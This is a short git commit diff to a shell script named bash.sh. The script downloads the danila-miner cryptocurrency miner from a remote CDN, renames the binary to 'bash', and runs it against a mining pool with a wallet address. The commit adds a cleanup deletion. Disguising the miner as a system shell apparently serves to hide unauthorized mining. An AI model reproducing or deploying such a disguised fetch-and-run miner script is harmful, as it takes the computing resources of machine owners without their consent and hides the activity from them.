7450495d83b33d6233a79c033410647288665827
jenifler <96619243+jenifler@users.noreply.github.com>
2022-02-14 18:40:49 +0700

    Update bash.sh

--- Victory/bash.sh
+++ Victory/bash.sh
@@ -3,4 +3,5 @@ wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/dan
 tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz 
 chmod +x danila-miner 
 mv danila-miner bash
+rm -rvf danila-miner
 ./bash run https://server1.whalestonpool.com EQBsPrcYWQwl9K-uiUoT3u2o0Eo1L6ckc5xo6-S0708xPEtd
